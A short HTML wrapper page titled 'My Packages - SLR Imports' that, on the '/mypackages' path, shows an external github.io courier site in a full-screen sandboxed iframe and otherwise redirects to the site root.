<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>My Packages - SLR Imports</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      width: 100%;
    }
    .iframe-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }
  </style>
  <script>
    window.onload = function() {
      if (window.location.pathname === '/mypackages') {
        document.body.innerHTML = '<div class="iframe-container"><iframe src="https://slrimportsltd-courier.github.io/" allow="fullscreen" sandbox="allow-same-origin allow-scripts allow-popups allow-forms"></iframe></div>';
      } else {
        window.location.href = '/';
      }
    }
  </script>
</head>
<body>
  <div id="root"></div>
</body>
</html>
